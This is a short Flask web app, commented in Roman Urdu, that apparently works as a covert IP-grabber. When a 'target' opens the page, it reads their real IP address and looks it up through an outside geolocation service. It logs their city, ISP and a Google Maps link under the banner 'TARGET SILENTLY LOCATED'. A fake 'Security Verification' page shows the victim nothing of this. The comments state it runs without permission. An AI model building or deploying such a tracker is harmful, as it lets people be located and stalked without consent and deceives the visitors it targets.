from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    # Target ka asli IP nikalna
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # Silent Location (Bina permission ke)
    try:
        data = requests.get(f'https://ipapi.co/{ip}/json/').json()
        city = data.get('city', 'Unknown')
        isp = data.get('org', 'Unknown')
        lat = data.get('latitude', '0')
        lon = data.get('longitude', '0')
    except:
        city = isp = lat = lon = "Error"

    # Logs mein print karna (Ye Vercel Logs mein nazar ayega)
    print(f"\n--- [!!!] TARGET SILENTLY LOCATED [!!!] ---")
    print(f"IP: {ip} | City: {city} | ISP: {isp}")
    print(f"Google Map: https://www.google.com/maps?q={lat},{lon}\n")

    return "<h2>Security Verification...</h2><p>Checking connection stability, please wait.</p>"
